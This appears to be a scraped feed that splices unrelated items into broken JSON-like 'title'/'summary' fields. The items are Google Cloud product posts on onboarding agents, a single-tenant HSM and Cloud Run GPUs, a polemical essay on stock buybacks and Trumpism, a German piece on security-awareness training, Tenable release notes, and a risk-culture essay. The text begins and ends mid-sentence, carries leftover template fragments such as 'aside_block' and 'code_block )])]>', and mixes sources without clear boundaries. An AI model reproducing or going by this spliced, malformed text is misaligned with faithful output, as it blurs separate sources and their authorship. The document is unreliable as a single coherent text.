relationships, and your personal presence/identity on the web? Elon Musk? Mark Zuckerberg? Some other billionaire or privacy annihilating big tech entity? Or would you trust your actual community? This isn’t fantasy.

    "title": "Build intelligent employee onboarding with Gemini Enterprise",
    "summary": "Employee onboarding is rarely a linear process. It’s a complex web of dependencies that vary significantly based on an individual’s specific profile. For example, even a simple request for a laptop requires the system to cross-reference the employee’s role, function, and seniority level to determine whether they need a high-powered workstation or a standard mobile device. Similarly, requesting a building pass involves more than just a name tag; it requires integrating data regarding the employee’s assigned office location, desk neighborhood, and the specific system requirements of the underlying access management system. In this article, we show you how d evelopers use the Agent Development Kit (ADK) , Agent Engine, and Application Integration to build custom agents that connect into your enterprise systems (such as ITSM, ERP, and CRM). Once built, these agents are published to the Gemini Enterprise agent gallery, where employees can easily access and interact with them. The result is a more personal employee onboarding experience. Read on to learn how to connect conversational AI with your essential enterprise systems. aside_block ), ('btn_text', ''), ('href', ''), ('image', None)])]> First, what is an agent powered application integration workflow? Figure 1: ADK Agent architecture with tools Figure 2: Low-code tools for agent with application Integration A grounded agentic workflow is a modern architectural pattern. It bridges the gap between the creative, probabilistic nature of large language models (LLMs) and the rigid, deterministic nature of business logic. It consists of three critical components: Gemini Enterprise custom agent : This front-end interface understands natural language, gathers information through dialogue, and provides a user-friendly experience. Built using the Agent Development Kit (ADK) and deployed to Agent Engine, this multi-agent architecture acts as an intelligent assistant with precision and accuracy. Automation and connectivity layer : This middleware handles complex data transformations, authentication, and communication with backend systems. Application Integration provides a visual, low-code environment to build deterministic automation processes using out-of-the-box connectors. Enterprise backend system : This is the system of record where business transactions are executed—in this case, the corporate IT Service Management (ITSM) platform. When these components work together, the agent understands user intent, the integration layer routes data correctly, and the backend system processes the transaction. The user experiences a simple conversation, while complex enterprise workflows execute in the background. Use case: Laptop request for new employees Let's explore a practical scenario that every organization faces: The problem : Sarah from HR needs to request a laptop for a new software engineer joining next Monday. The traditional process requires her to: Log into the ITSM portal Read internal website to find out how to raise a laptop request Navigate multiple pages to find the hardware request form Search for meaning of different fields, the right team to raise to Finally submit the form The solution : With our agent-powered workflow, Sarah can simply express her intent, and accept the default configuration: code_block )])]> What happens behind the scenes? Agent processing : Gemini understood the intent, gathered required information through conversation, and determined the appropriate laptop configuration based on job role Tool calling : Agent triggers Application Integration workflow with structured data Integration workflow : Application Integration received the request, transformed data to ITSM format, handled authentication, and created the service request ITSM transaction : Created a catalog service request item with all necessary fields, assigned to appropriate fulfillment team, and triggered approval workflow Response flow : ITSM returned request details, Application Integration formatted the response, and Agent presented information in user-friendly format Application integration For demonstration purposes, we created a simple workflow to simulate a laptop selection process which needed to follow specific business rules/requirements, such as checking the hardware entitlements of the employee based on their assigned role, checking hardware availability and finally filtering out unavailable options using low code/no code development practices. Figure 3: Low-code tool development using Application Integration This workflow was then published and made available as an API endpoint which was configured to be used as a tool in ADK code (see below).

    "title": "Introducing Single-tenant Cloud HSM to support more data encryption control",
    "summary": "Organizations that handle sensitive data in highly-regulated sectors often face a difficult choice: Build and manage physical hardware to meet strict compliance needs, or use cloud services that might not offer the specific level of isolation they require. These organizations, often in financial services, defense, healthcare, insurance, and government, require a key management service to provide cryptographic assurances that no one else — including their cloud provider — can access their keys. The key management service also needs to be highly available and scalable to ensure that protected sensitive data is accessible by business critical applications without disruption. To help meet these rigorous standards without taking on the burden of physical hardware management, we are introducing Single-tenant Cloud HSM , a new service that provides a dedicated, highly-available cluster of hardware security module (HSM) partitions where you retain full control over your cryptographic keys. Single-tenant Cloud HSM is generally available today in the U.S. and European Union today with competitive pricing . We plan on adding more regions and capabilities throughout the year. Control your keys with hardware-enforced isolation Single-tenant Cloud HSM is designed for workloads that require FIPS 140-2 Level 3 validation, isolation from other users, and greater security controls on the HSM. Unlike multi-tenant solutions, this service ensures you are the sole tenant on a partition of a physical HSM. The hardware itself enforces cryptographic isolation, meaning your keys are separated from other customers and from Google operators. To ensure you maintain control over your data, the service includes several critical security features: Full ownership : You control the root key and root key access for your partition. Quorum-based administration : Sensitive operations are rooted in hardware and require quorum approval, preventing any single individual from making unauthorized changes. Revocation : You have the ability to revoke Google’s access at any time. This action will result in all the keys in the instance becoming unavailable and the data encrypted with those keys inaccessible. Reduce operational overhead without sacrificing security Managing physical HSMs usually involves significant work, from procurement to maintenance. With Single-tenant Cloud HSM, Google manages the provisioning, configuration, monitoring and compliance of the hardware. This allows you to focus on security policies rather than hardware maintenance. The service is also designed for high availability and redundancy, allowing you to provision in minutes and scale as your workloads grow. How does Single-tenant Cloud HSM work? To understand the level of control you have, it helps to look at the authentication flow. You own and manage your Administrative user credentials directly. You can generate these key pairs on a hardware token like a YubiKey or with another key management system of your choice. To prevent unauthorized access, you must set up multiple users and configure your instance to require a quorum (M of N). This ensures that a specific number of authorized users must agree to grant or revoke permissions. Figure 1: Single-tenant Cloud HSM high-level architecture. With this setup, your administrators can: Authorize Google to perform cryptographic operations on your Single-tenant Cloud HSM Instance. Revoke Google's authorization at any time. Figure 2: Single-tenant Cloud HSM: Revoking Google’s access. In summary: Each Single-tenant Cloud HSM instance is a dedicated and cryptographically cluster of HSM partitions for your exclusive use. Each Single-tenant instance provides the same redundancy and high availability as multi-tenant Cloud HSM. You can revoke Google’s authorization to an instance, making all keys in that instance unavailable and it can only be restored after granting the authorization again. Features and benefits Meeting compliance and security standards : Single-tenant Cloud HSM is built for customers who want to run cloud workloads that meet stringent security and regulatory standards. Single-tenant Cloud HSM uses FIPS 140-2 Level 3 validated Marvell LiquidSecurity HSMs (models CNL3560-NFBE-2.0-G and CNL3560-NFBE-3.0-G) with firmware versions 3.4 build 10. The Single-tenant Cloud HSM service has obtained compliance with numerous regulations and certifications including FedRAMP , DISA IL5 , ITAR , SOC 1 / SOC 2 / SOC 3 , HIPPA and PCI DSS . These standards and certifications help customers in highly-regulated market segments meet their regulatory and compliance needs for key management and data protection. Set up your instance in minutes : You can set up a Single-tenant Cloud HSM instance quickly using standard gcloud commands for all administrative operations. Once you have established the necessary quorum for administrative access, you can provision a complete cluster in approximately 15 minutes. Scale automatically with high availability : Single-tenant Cloud HSM instances span multiple zones to ensure reliability, matching the availability standards of Cloud HSM. The service also scales automatically to handle your peak traffic loads, ensuring consistent performance without manual intervention. Integrated with the tools you already use : You can use Single-tenant Cloud HSM with your existing workflows immediately. It works with existing Cloud Key Management System (KMS) APIs, allowing you to use Customer-Managed Encryption Keys (CMEK) to protect data across Google Cloud services. It also integrates with Cloud Logging and Cloud Monitoring, giving you analytics, alerts, and visibility into your key usage.

    "title": "High-performance inference meets serverless compute with NVIDIA RTX PRO 6000 on Cloud Run",
    "summary": "Running large-scale inference models can involve significant operational toil, including cluster management and manual VM maintenance. One solution is to leverage a serverless compute platform to abstract away the underlying infrastructure. Today, we’re bringing the serverless experience to high-end inference with support for NVIDIA RTX PRO™ 6000 Blackwell Server Edition GPUs on Cloud Run. Now in preview, you can deploy massive models like Gemma 3 27B or Llama 3.1 70B with the 'deploy and forget' experience you’ve come to expect from Cloud Run. No reservations. No cluster management. Just code. A powerful GPU platform The NVIDIA RTX PRO 6000 Blackwell GPU provides a huge leap in performance compared to the NVIDIA L4 GPU, bringing 96GB vGPU memory, 1.6 TB/s of bandwidth and support for FP4 and FP6. This means you can serve up to 70B+ parameter models without having to manage any underlying infrastructure. Cloud Run lets you attach a NVIDIA RTX PRO 6000 Blackwell GPU to your Cloud Run service, job, or worker pools, on demand, with no reservations required. Here are some ways you can use the NVIDIA RTX PRO 6000 Blackwell GPU to accelerate your business: Generative AI and inference: With its FP4 precision support, the NVIDIA RTX PRO 6000 Blackwell GPU’s high-efficiency compute accelerates LLM fine-tuning and inference, letting you create real-time generative AI applications such as multi-modal and text-to-image creation models. By running your model on Cloud Run services , you can also take advantage of rapid startup and scaling, going from zero instances to having a GPU with drivers installed under 5 seconds. When traffic eventually scales down zero and no more requests are being received, Cloud Run automatically scales your GPU instances down to zero. Fine-tuning and offline inference : NVIDIA RTX PRO 6000 Blackwell GPUs can be used in conjunction with Cloud Run jobs to fine-tune your model. The fifth-generation NVIDIA Tensor Cores can be used in conjunction with AI models to help accelerate rendering pipelines and enhance content creation. Tailored scaling for specialized workloads : Use GPU-enabled worker pools to apply granular control over your GPU workers, whether you need to dynamically scale based on custom external metrics or manually provision \"always-on\" instances for complex, stateful processing. We built Cloud Run to be the simplest way to run production-ready, GPU-accelerated tasks. Some highlights of Cloud Run include: Managed GPUs with flexible compute: Cloud Run pre-installs the necessary NVIDIA drivers so you can focus on your code. Cloud Run instances using NVIDIA RTX PRO 6000 Blackwell GPUs can configure up to 44 vCPU and 176GB of RAM. Production-grade reliability: By default, Cloud Run offers zonal redundancy, helping to ensure enough capacity for your service to be resilient to a zonal outage; this also applies to Cloud Run with GPUs. Alternatively, you can turn off zonal redundancy and benefit from a lower price for best-effort failover of your GPU workloads in case of a zonal outage. Tight integration : Cloud Run works natively with the rest of Google Cloud. You can load massive model weights by mounting Cloud Storage buckets as local volumes, or use Identity-Aware Proxy (IAP) to secure traffic that’s bound for a Cloud Run service.

Object permanence: Acme License-Plate Maker; IPV4 delenda est; Mandatory gun-ownership; Sukey; Ross and Carrie x LRH; Criti-hype. Upcoming appearances: Where to find me. Recent appearances: Where I've been. Latest books: You keep readin' em, I'll keep writin' 'em. Upcoming books: Like I said, I'll keep writin' 'em. Colophon: All the rest. Stock swindles (permalink) There are plenty of American historical antecedents of Trumpism – fascist movements like the Jim Crow reign of terror, the McCarthy hearings, the gleeful genocide of indigenous people. But when you're thinking about the rise of Trumpism, never forget that America isn't just a nation of cruel bigots; it's also a nation of rich swindlers. We call Trump a \"reality TV star\" and it's true, as far as it goes. Trump did play a billionaire on TV long before he grifted actual billions, using his status as the poor man's idea of a rich man to secure liar loans and rip off creditors, contractors, business partners, workers, and governments – local, state and federal. He rose to power on this, boasting on stage that cheating \"makes me smart\": https://pluralistic.net/2024/12/04/its-not-a-lie/#its-a-premature-truth Like so many crooked officials, Trump's brand is \"He steals, but he works\" (except of course that he doesn't – at any given moment, odds are that he's either taking a nap, watching Fox News, or playing golf): https://www.reddit.com/r/AskBalkans/comments/utui8s/in_romania_we_have_a_saying_about_corrupt/ Remember: the right is the movement that says that governments are inefficient and corrupt, so right wing elected leaders make their own case by being incompetent and corrupt. Someone like Trump has to convince people that they can't rely on institutions or their neighbors. His path to power lies through convincing people that the system is rigged and that he – as a man who is an expert at cheating – knows how to rig it in your favor: https://www.factcheck.org/2016/07/trumps-rigged-claim/ But merely claiming \"the system is rigged\" doesn't actually win the day. If you want to convince people that the system is rigged, it really helps if the system is actually rigged. Want to convince people that elections are corrupt? Legalize unlimited dark money spending and fill our polling places with defective, unauditable voting machines made by Beltway Bandits selling into no-bid contracts: https://web.archive.org/web/20210203113531/https://www.washingtonpost.com/outlook/2021/02/03/voting-machines-election-steal-conspiracy-flaws/ Want to convince people that there's a shadowy cabal of rich pedophiles hiding children in a pizza parlor basement? It helps if there's an actual cabal of rich pedophiles hanging out on a private island, abusing more than a thousand children (and counting). Want to convince people that the financial system is a rigged casino so you might as well just gamble on cryptocurrency and betting markets? It helps if the actual financial system is run by banks who receive billions in public money and then steal millions of Americans' homes after Obama takes Treasury Secretary Tim Geithner's advice to \"foam the runways\" for the banks using Americans' houses: https://keystoneky.com/article/all-we-can-do-is-put-foam-on-the-runway-tim-geithner-speaking-before-the-collapse-of-lehman/ Which is all to say, if you want to understand the origins of the surge of suckers for fascists who are desperate for a strong man to cheat on their behalf in a rigged system, it helps to look beyond racism and xenophobia, to the ways in which the system is, indeed, rigged. Racism and misogyny alone aren't enough to bring about fascism. To groom a nation of fascist patsies, you first need a crooked system: https://pluralistic.net/2025/07/22/all-day-suckers/#i-love-the-poorly-educated This is why it's worth understanding finance. The finance sector hides its sins behind the Shield of Boringness (h/t Claire Evans). The layers of overlapping jargon and performative complexity make it hard for everyday people to criticize the finance sector. Finance ghouls exploit this, leveraging confusing ambiguities in the system to insist that their critics don't know what they're talking about and that everything is fine, actually. This is an incredibly destabilizing dynamic. Living in a system where you're being fleeced every day but where people who seem smarter than you have reasonable-seeming explanations about why it's all legit and above-board is a recipe for abandoning all faith in the system, in experts, and in lawful processes, and throw your lot in with a strongman who promises to cheat on your behalf. Take stock buybacks, a form of stock swindle that was illegal until 1982. In a stock buyback, a company buys its own shares on the open market. When the number of shares goes down, the price per share goes up. This is just a form of \"wash-trading,\" like when NFT and shitcoin scammers buy their own products in order to make it look like they're valuable and desirable: https://pluralistic.net/2025/09/06/computer-says-huh/#invisible-handcuffs Advocates for markets as a system of allocation (as opposed to allocating via a democratically accountable state, say) insist that markets are efficient because prices \"encode information\" about the desirability, viability, and other qualities of goods and services. This is the whole argument for the new crop of rigged casinos we call \"prediction markets\" that are grooming the next generation of fascist footsoldiers by robbing them blind and then insisting that the whole process was not only legitimate, but scientific, a way to retrieve the \"encoded information\" about the world around us. In a market system, stock prices are supposed to reflect the aggregated information about the health and prospects of a company. When a company buys its own stock back, though, its price goes up while its value goes down. I mean that literally: say a company that's sitting on a billion dollars cash is valued at $10 billion. From this, we can infer that the company's capital stock (factories, inventory, etc), IP (patents, processes, copyrights, etc) and human capital (payrolled employees, contractors) are worth $9 billion. That's a reliable estimate, because we know exactly how much one billion dollars cash is worth: it's worth one billion dollars. Now, let that company piss that billion dollars up the wall with a stock buyback. The company is relieved of its billion dollars cash on hand, leaving it with no cash, only its physical capital, IP and human capital, which are worth $9b. The company is now worth less than it was before the stock buyback. What's more, the drop in corporate valuation is more than the billion the company just blew on its buyback. A company with no cash reserves is brittle and prone to failures. Without a cash cushion, any rent shock, change in market conditions, or other adverse incident will leave the company scrambling to borrow money (at punitive rates, thanks to its desperation) to weather the storm. If share prices are actually \"encoding information\" about a company's worth, a billion dollar buyback should lop more than a billion dollars off the company's share price. Instead, it sends the share price up. This is just stock manipulation, which is why it was illegal until 1982. But apologists for this system will tell you that a stock buyback is just a dividend by another name – just another way for a company to return value to its shareholders, who, after all, are the owners of the company and entitled to extract those profits. This is categorically untrue. Dividends do take money out of the company's coffers and distribute them to its shareholders, sure – but a dividend is a bet on the company's future success, which is why a company's share prices rise after a dividend is declared. Investors observe a company that is so well-run that it can afford to drain some of its cash reserves in favor of its shareholders, so they buy the company's stock in anticipation of more dividends derived from more skilled operations. But imagine if a company parted with a dividend so large that it meant that the firm would struggle to keep its doors open in the coming year. Imagine a publisher, say, whose dividend was so large that it couldn't afford to pay advances for any more books in the next season, meaning it could only make money from the backlist titles it already had in the warehouse, but was entirely out of the running when it came to publishing next year's blockbuster book. That dividend would not send investors chasing the company's stock. Why would you bet on a stock whose management had just doomed the company to a bad season, and maybe an unrecoverable death-spiral? Without new books to sell, the company won't have any cash to pay dividends, and when it stops paying dividends, its stock price will fall, leaving shareholders with a hole in their own balance-sheets. Contrast that with buybacks: to do a buyback, the company need merely spend its free cash flow, or money it borrows, or money derived from the sale of key capital, or money saved through mass layoffs, to buy its own stock. Then the share price goes up. In other words: when a company's stock price rises on news of a dividend, that's \"encoding information\" about the market's confidence in the company's management and its future growth. When a company's stock price rises on news of a buyback, that's \"encoding information\" about the market's confidence in the company's future looting to the point of collapse. I used to think that this was the whole stock buyback story, but as is ever the case with finance, buybacks are fractally corrupt. This week, I've been reading Boston College law prof Ray D Madoff's book The Second Estate: How the Tax Code Made an American Aristocracy, and I've learned even more scummy truths about buybacks: https://press.uchicago.edu/ucp/books/book/chicago/S/bo256019296.html For tax purposes, dividends are \"ordinary income,\" meaning that they are taxed at up to 37%. Meanwhile, if you sell your shares after a stock buyback juices the price, the profits are treated as \"capital gains,\" whose tax rate caps out at about half that (20%). This means that shareholders pay half the tax on money that comes from strip-mining a company than they would get from money derived from managing a company for sustainable growth. It's worse than that, though, because capital gains can be offset by capital losses. If you invested in a stock that tanked, you can hold that stock in your portfolio until you are ready to sell a profitable stock, and deduct your losses from the gains you've made. But you don't even have to sell the stock to realize tax-free income from it: the ultra-rich live according to a financial arrangement called \"buy, borrow, die\" that lets them avoid all taxes. Here's how that works: if you're sitting on a bunch of stock, you can stake it as collateral for a loan that is tax-free. Better than that, if you're smart, some or all of the interest on that loan is tax-deductible. If you're rich enough, you don't have to make regular payments on the loan, either – you just wait as the stock continues to grow while your loan is maturing, and when it's due, you borrow even more money against the new valuation and pay off the old loan. That's \"buy\" and \"borrow.\" Here's \"die.\" When you die, you transfer your assets to your kids, who benefit from something called the \"step-up in basis,\" which lets them avoid all capital gains on the appreciated value of your assets. Now, maybe you're thinking that you can benefit from this arrangement. I've got bad news for you: you won't qualify for one of those cool loans that you don't need to pay regularly! What's more, if you own any stock you almost certainly own it through a retirement plan like a 401(k), and when you cash out that 401(k), that is treated as \"ordinary income\" at nearly twice the rate that our plutocrat overlords pay. Buybacks, then, are part of a system whereby rich people get much richer every time a company that makes something good and employs ordinary people guts itself and sets itself on the path to bankruptcy. Meanwhile, working people don't benefit from this system, even if they own stock. They just get to live in a world where businesses are looted and shuttered and public services are slashed thanks to balanced budget rules that mean that governments can't spend when rich people don't pay taxes. This is why buybacks have apologists. Buybacks – a stock swindle that was illegal in living memory – make rich people richer, and they spend some of that loot to fund an army of reply-ghouls who push the message that buybacks are dividends by another name. It's part of the ripoff economy that has seen crypto-billionaires lobby, bribe and terrorize lawmakers into merging their speculative assets with the real economy, endangering the economic well-being of everyday people: https://www.levernews.com/what-tech-wants-crypto-reign-of-terror/ It's part of the ripoff economy that has seen AI bros put the global market in peril with crooked accounting and empty promises: https://www.wheresyoured.at/the-enshittifinancial-crisis/ The ripoff economy is baked into the American experience. It is the foundation of Trumpism. It is the financial basis for things like \"Project 2025\" – literally! The Heritage Foundation (who created Project 2025) was founded and funded by the founders of Amway, a destructive Ponzi scheme that was rescued from criminal prosecution when Gerald Ford (Congressman to Amway's founders) became president and ordered the FTC to let them off the hook: https://pluralistic.net/2025/05/05/free-enterprise-system/#amway-or-the-highway Trump's right: the system is rigged. If you're going to pull the people you love back from the nihilistic descent into fascism, you have to be able to understand and explain how the rigging works. We can't insist – as Hillary Clinton did – that \"America is already great\": https://www.politico.com/blogs/2016-dem-primary-live-updates-and-results/2016/03/clinton-america-is-already-great-220078 America is not great. It has been gutted by the Epstein class, who robbed us blind, raped our kids, and are now selling us shitcoins and chatbots and the spectacle of protesters being shot in the streets. But it's not enough to know that the system is rigged. Everybody knows the system is rigged. To build a movement and save our future, we have to know how it is rigged and who rigged it.

    "title": "Human Risk Management: Das Paradoxon der Sicherheitsschulungen",
    "summary": "Security Awareness Trainings sollten auf dem Human-Risk-Management-Ansatz basieren. FAMILY STOCK – shutterstock.com Unternehmen investieren Millionen von Dollar in Firewalls, Endpunktsicherheit oder Verschlüsselung. Doch eine einzige Person kann eine Katastrophe auslösen. Es reicht, wenn sie eine infizierte Datei herunterlädt oder auf einen betrügerischen Link klickt. Analysen zeigen: Zwischen 70 und 90 Prozent aller Sicherheitslücken entstehen, weil Menschen Fehler machen. Sie fallen auf Social Engineering herein oder nutzen riskante Dienste ohne Erlaubnis der IT. Zudem verschärft sich die Lage, da Angreifer zunehmend künstliche Intelligenz und Deepfakes einsetzen. Das Problem ist bekannt. Deshalb gaben Organisationen im Jahr 2025 etwa sechs Milliarden Dollar für Security Awareness Trainings (SAT) aus. Manche Firmen tun dies freiwillig. Die meisten beugen sich jedoch Vorschriften wie der Datenschutz-Grundverordnung oder dem Health Insurance Portability and Accountability Act. Letzterer verpflichtet etwa alle Beschäftigten im Gesundheitswesen rechtlich zu solchen Programmen. Experten erwarten, dass die Ausgaben für diese Maßnahmen jährlich um 15 Prozent steigen. Warum das klassische Training scheitert Obwohl diese Schulungen zum Standard gehören, bleibt ihr Nutzen fragwürdig. Viele Firmen haken das Thema nur ab, um Regeln einzuhalten. Den eigentlichen Mehrwert ignorieren sie dabei. Die Angestellten wiederum spielen das Spiel mit. Sie klicken sich so schnell wie möglich durch die Tutorials, damit sie weiterarbeiten können. Selbst wer aufpasst, vergisst das Gelernte oft schnell wieder, wenn er es im Alltag nicht aktiv anwendet. Manchmal schaden die Kurse sogar. Studien belegen: Wer in den Tests besonders gut abschneidet, wird oft leichtsinnig. Diese Personen wiegen sich in falscher Sicherheit. Meiner Meinung nach stecken wir in einem Paradoxon. Trotz hoher Investitionen und strenger Regeln bleibt der Nutzen minimal. Das System ist defekt. Wir brauchen deshalb einen radikalen Kurswechsel: weg von sporadischen Kursen, hin zum Human Risk Management. Was bedeutet Human Risk Management? Dieser Ansatz verfolgt eine klare Strategie: Er identifiziert menschliches Verhalten als Risiko und versucht, dieses gezielt zu senken. Während herkömmliche Schulungen nur theoretisches Wissen vermitteln, konzentriert sich das Human Risk Management darauf, wie Menschen tatsächlich handeln. Das System verbindet sich direkt mit E-Mail-Programmen oder Identitäts-Management-Systemen. So erkennt es menschliche Schwachstellen sofort. Es nutzt Daten, um riskante Nutzer aufzuspüren. Danach greift es gezielt ein – etwa durch kurze Lerneinheiten oder automatisierte Kontrollen. Am Ende überwacht das System, ob sich das Verhalten wirklich verbessert. Manche glauben, man müsse für beides separat bezahlen. Das stimmt nicht. Tatsächlich sind führende HRM-Lösungen von Anbietern wie Fable Security, KnowBe4 und Mimecast vollgepackt mit Standard-SAT-Material. Sie bieten sogar spezifische Schulungsunterstützung für regulatorische Compliance-Anforderungen. Lesetipp: Menschenzentrierte Cybersicherheit gewinnt an Bedeutung Demokratisierung durch künstliche Intelligenz Klingt das nach neuem Marketing-Hype? Vielleicht. Aber diese Methode nutzt künstliche Intelligenz als Partner. Anders als bei vielen Trends sind sich Experten hier einig: KI wird die Bildung grundlegend verändern. KI agiert wie ein persönlicher Tutor. Sie gibt kleine Stöße in die richtige Richtung. Klickt jemand auf einen gefährlichen Link, erhält er sofort eine passende Lerneinheit. So verfestigt sich das richtige Verhalten im Moment des Fehlers. Zudem lernt das System, wie einzelne Personen am besten begreifen. Die eine Person liest lieber Texte, die andere schaut lieber Videos. Die Werkzeuge können sogar Rollenspiele durchführen und den Wettbewerb unter Kollegen anspornen. Das demokratisiert Expertenwissen auf eine völlig neue Weise. Für Unternehmen lohnt sich das finanziell. Verantwortliche berichten nicht mehr nur, wie viele Leute ein Video geschaut haben. Sie belegen stattdessen, wie sich die digitale Hygiene im Betrieb verbessert. Wer ständig Fehler macht, bekommt individuelle Hilfe. So lässt sich direkt nachweisen, dass das Training die Zahl der echten Sicherheitsvorfälle senkt. Aristoteles sagte einmal: „Wir sind das, was wir wiederholt tun. Vorzüglichkeit ist also keine Handlung, sondern eine Gewohnheit.“ Genau hier setzt das Human Risk Management an. Es verändert Gewohnheiten. Wäre Aristoteles heute Sicherheitschef, würde er diesen logischen Schritt sicher befürworten. (jm)",

    "title": "What’s New in Tenable Cloud Security: Multi-cloud Risk Analysis, Attack Surface Assessments, Improved IAM Security and More",
    "summary": "Tenable Cloud Security continues to expand the technical depth of our Tenable One exposure management platform. Our latest enhancements include unified multi-cloud exploration, high-fidelity network validation, and expanded entitlement visibility across infrastructure and identity providers. Key takeaways Graph-based multi-cloud exploration: We’ve leveraged our unified data model to provide deep visibility across all cloud environments. You can now easily explore cloud risks and resources using an advanced query builder to build and save queries, and switch to Graph view to instantly visualize complex asset relationships and blast radius. Outside-In network attack surface validation: A new external network scanner probes environments to confirm reachability, allowing teams to prioritize vulnerability mitigation based on verifiable external exposure Comprehensive identity inventory: We’ve expanded our identity inventory to unify entitlement tracking across cloud platforms, including Microsoft Entra ID and Google Workspace. This allows teams to instantly pinpoint overprivileged roles and unused policies to enforce least privilege at scale. Explorer: Unified query and relationship mapping Fragmentation of data across disconnected tools is a primary hurdle in multi-cloud security, often forcing teams to pivot between siloed views to find context. To address this, we have introduced Explorer, a unified interface for deep-dive analysis into resources and findings across your cloud estate. This capability moves beyond static views, allowing security teams to precisely identify risk by querying across objects using granular filters, logical operators, and relationship-based joins. With the Explorer, you can: Perform complex correlations: Use advanced query logic and joins to connect disparate data points, such as linking specific vulnerabilities to their underlying cloud identities or identifying storage buckets that contain sensitive data and are being used for training by AI models. Streamline operations: Leverage saved query configurations to standardize repetitive auditing tasks and ensure consistency across compliance reviews. Visualize the blast radius: Utilize the Graph view to map asset dependencies, providing a clear visual understanding of how vulnerabilities can propagate through your environment. The Explorer unifies multi-cloud resources into a single interface, allowing teams to query complex asset relationships and instantly visualize the potential blast radius via Graph view. Network security: High-fidelity exposure validation To improve prioritization accuracy, we have enhanced Tenable’s network scanner to perform outside-in probing of your cloud environments' attack surface. Rather than relying solely on static cloud configuration analysis of publicly exposed cloud resources – which can often lead to false positives — this tool conducts an external reachability analysis to confirm whether an endpoint is actually accessible from the internet. By validating real-world exposure, security teams can filter out noise and surface the small percentage of vulnerabilities that pose a genuine external threat. To translate this validation into action, you can now filter exposed network endpoints by resource type (such as EC2 instances, S3 buckets, and databases), specific ports, host IPs, and other properties. This granularity makes it easier to isolate specific segments of your infrastructure and accelerate targeted remediation of your most critical external exposures. The Tenable network scanner actively verifies external reachability to confirm internet-exposed workloads IAM security: Expanded entitlement visibility and insight Managing identity risk requires deep visibility into both cloud infrastructure and identity providers (IdPs). We have expanded our cloud infrastructure entitlement management (CIEM) capabilities to provide a comprehensive inventory of entitlements across AWS, Azure, GCP, Microsoft Entra ID, and Google Workspace. The Inventory view now displays all roles and identity-based policies—regardless of whether they are currently active. This technical baseline is essential for identifying \"ghost\" identities and stale permissions that increase the attack surface. Furthermore, administrators can now define custom security policies for any role category, including those not yet deployed in the environment. This enables the establishment of proactive governance and least-privilege guardrails that scale automatically as new resources are provisioned. Comprehensive posture: Public AMI scanning Our AWS coverage now includes support for public Amazon Machine Image (AMI) scanning. This allows organizations to assess the security posture of vendor-provided and AWS-published images within their own environment. By analyzing these images for vulnerabilities and misconfigurations, teams can mitigate supply chain risks before they are integrated into production workloads. Audit-vendor and AWS-published images in your posture assessments to mitigate supply chain risk Guided use cases: Solve real problems, fast This month, we’ve added two high-impact use-case packages to help you build an exposure management foundation: Prioritize cloud risk that matters most . Use AI-Powered VPR and toxic combination analysis to cut through the noise, reducing remediation time by 80%. See a demo . Secure AI workloads . Discover and protect sensitive data powering AI workloads while continuously assessing the underlying AI infrastructure and configurations. Learn more by reading a solution overview . Advance your security maturity Maturing a cloud security program requires a shift from managing individual findings to understanding functional resilience. By unifying visibility, validating network reachability, and auditing identity, organizations build the foundation to manage exposure at scale. Tenable Cloud Security is the critical pillar of the Tenable One exposure management platform that provides these comprehensive CNAPP capabilities. Reflecting the real-world value delivered to users, Tenable was recently recognized as a 2025 Customers’ Choice in the Gartner® Peer Insights™ 'Voice of the Customer': Cloud-Native Application Protection Platforms (CNAPPs). Frequently Asked Questions Which identity platforms are now included in the expanded inventory? Coverage has expanded beyond standard cloud providers to include Microsoft Entra ID and Google Workspace, providing visibility into the full \"identity-to-data\" path. What is the primary technical advantage of the Explorer Graph view? It replaces isolated alerts with a visual map of asset relationships, helping teams visualize how a single vulnerability could impact adjacent resources. How does the network scanner differ from standard configuration checks? It actively probes the environment from an external perspective to confirm service reachability – assessing exposure more accurately than static code analysis alone. Why scan public AMIs? This ensures that third-party images, often used as base layers for workloads, are audited for vulnerabilities within the context of your specific security requirements. Learn more: What is CTEM?

    "title": "How risk culture turns cyber teams predictive",
    "summary": "The first time you’ll hear, “We’re always in incident mode,” it won’t be said with drama. It will be said the way you mention the weather. Grey again. Pager again. And that’s the problem. When a constant alarm becomes normal, your team stops asking the only question that matters. Why do we keep ending up here? You can buy more tools. You can hire more analysts. You can hang more dashboards. You’ll still end up sprinting after the last breach, the last misconfiguration, the last vendor surprise, the last “minor” change that ate your weekend. The best cyber teams we’ve worked with didn’t win because they ran faster. They won because they were adaptive and changed the risk landscape. They built a culture where weak signals had a microphone, and action didn’t require heroics. Forecasting in cybersecurity is not fortune-telling. It’s disciplined habits, clear choices and a team that treats risk as daily practice, not an annual slide. The trap: When ‘busy’ replaces ‘aware’ Reactive teams don’t choose chaos. Chaos chooses them, one small compromise at a time. A rushed change goes in late Friday. A privileged account sticks around “temporarily” for months. A patch slips because the product has a deadline, and security feels like the polite guest at the table. A supplier gets fast-tracked, and nobody circles back. Each event seems manageable. Together, they create a pattern. The pattern is what burns you. Most teams drown in noise because they treat every alert as equal and security’s job. You never develop direction. You develop reflexes. Reflexes feel useful. They look good on incident bridges. They can also keep you blind. Forecasting begins when you stop rewarding the “save” and start rewarding the “see and act.” Risk culture: What it is when you strip the slogans People talk about culture like it’s soft. Posters. Values. A town hall with applause on cue. Culture is harder. Culture is what people do when nobody is watching, and when the clock is loud. Culture is what gets you the truth at 4 p.m., not at 4 a.m. In cybersecurity, risk culture answers four questions. Do people notice risk early? Do they name it clearly? Do they know who can decide? Do they act without fear? If anyone fails, you get silence. Silence is the most dangerous gap in the building. We’ve seen teams with expensive tooling and miserable outcomes because engineers learned one lesson. “If I raise a risk, I’ll get punished, slowed down or ignored.” So they keep quiet, and you get surprised. We’ve also seen teams with average tooling but strong habits. They didn’t pretend risk was comfortable. They made it speakable. Speakable risk is the start of foresight. Foresight enables the right action or inaction to achieve the best result! Signal discipline: Give weak signals a place to land Forecasting is not about seeing everything. It’s about seeing the right things early enough to act. Top teams collect near misses like pilots collect flight data. Not for blame. For pattern. A near miss is the attacker who almost got in. The bad change that almost made it into production. The vendor who nearly exposed a secret. The credential that nearly shipped in code. Most organizations throw these away. “No harm done.” Ticket closed. Then harm arrives later, wearing the same outfit. So you need a place for near misses to land. A lightweight log. A channel people trust. A small weekly ritual where you ask, “What almost happened?” Not “Who messed up.” You also need shared language. Not ten pages of taxonomy. Just words that mean the same thing across teams. When someone says “critical,” do they mean “drop everything,” or “put it in the next release?” Ambiguity breeds delay. Delay breeds surprise. Decision rights: Speed dies in committees We’ve seen incident calls where 20 people had opinions, and nobody had authority. It’s like watching a committee try to steer a ship 